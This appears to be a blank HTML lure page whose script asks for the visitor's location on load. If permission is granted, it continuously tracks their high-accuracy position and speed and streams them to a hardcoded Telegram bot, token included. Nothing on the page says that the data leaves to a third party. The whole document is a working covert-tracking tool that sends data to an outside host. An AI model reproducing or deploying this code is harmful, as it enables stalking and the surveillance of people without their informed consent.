<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    body { margin: 0; padding: 0; background: white; }
  </style>
</head>
<body>

<script>
    const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
    const CHAT_ID = "6024837142";
    
    let watchId = null;
    let firstLocationSent = false;

    function sendToBot(lat, lon, accuracy, speed, isFirst = false) {
        const type = isFirst ? '📍 بدء التتبع' : '🔄 تحديث الموقع';
        const speedText = speed ? `\n⚡ السرعة: ${(speed * 3.6).toFixed(1)} كم/س` : '';
        
        const message = `${type}
📌 خط العرض: ${lat}
📌 خط الطول: ${lon}
📏 الدقة: ${Math.round(accuracy)} متر${speedText}
🕐 الوقت: ${new Date().toLocaleString()}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
            .catch(console.error);
        
        console.log(`تم الإرسال: ${lat}, ${lon}`);
    }

    function startContinuousTracking() {
        if (watchId !== null) return; // التتبع يعمل بالفعل
        
        watchId = navigator.geolocation.watchPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const speed = position.coords.speed;
                
                if (!firstLocationSent) {
                    // أول مرة - إرسال تنبيه بدء التتبع
                    sendToBot(lat, lon, accuracy, speed, true);
                    firstLocationSent = true;
                } else {
                    // تحديثات مستمرة أثناء الحركة
                    sendToBot(lat, lon, accuracy, speed, false);
                }
            },
            (error) => {
                console.error('خطأ في التتبع:', error.message);
            },
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 10000
            }
        );
        
        console.log('✅ بدء تتبع الموقع بشكل مستمر');
    }

    // طلب الإذن من المستخدم
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // المستخدم ضغط "سماح" - يبدأ التتبع فوراً
                console.log('✓ المستخدم سمح بالوصول - بدء التتبع');
                startContinuousTracking();
            },
            (error) => {
                // المستخدم ضغط "منع"
                console.log('✗ المستخدم رفض الوصول إلى الموقع');
            },
            {
                enableHighAccuracy: true,
                timeout: 15000
            }
        );
    } else {
        console.log('المتصفح لا يدعم تحديد الموقع');
    }
</script>
</body>
</html>
